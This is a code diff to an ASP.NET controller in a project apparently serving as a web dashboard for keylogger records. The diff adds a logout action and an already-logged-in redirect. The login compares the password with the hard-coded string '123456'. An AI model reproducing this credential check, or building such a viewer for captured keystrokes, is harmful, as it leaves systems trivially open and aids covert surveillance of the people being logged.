@@ -20,8 +20,7 @@ namespace KeyLoggerWEB.Controllers
             _repository = keyLoggerRepository;
         }
 
-        [Authorize]
-        [Route("Index")]
+        [Authorize, Route("Index")]
         public async Task<IActionResult> Index()
         {
             return View(await _repository.GetAllAsync());
@@ -30,15 +29,27 @@ namespace KeyLoggerWEB.Controllers
         [HttpGet, Route(""), Route("Login")]
         public IActionResult Login()
         {
+            if (User.Identity?.IsAuthenticated == true)
+            {
+                return RedirectToAction(nameof(Index));
+            }
+
             return View();
         }
 
+        [HttpPost("Logout")]
+        public async Task<IActionResult> Logout()
+        {
+            await HttpContext.SignOutAsync();
+            return RedirectToAction(nameof(Login));
+        }
+
         [HttpPost("Login")]
-        public async  Task<IActionResult> Login(Login login)
+        public async Task<IActionResult> Login(Login login)
         {
             try
             {
-                if(login.Password == "123456")
+                if (login.Password == "123456")
                 {
                     var claims = new List<Claim>
                     {
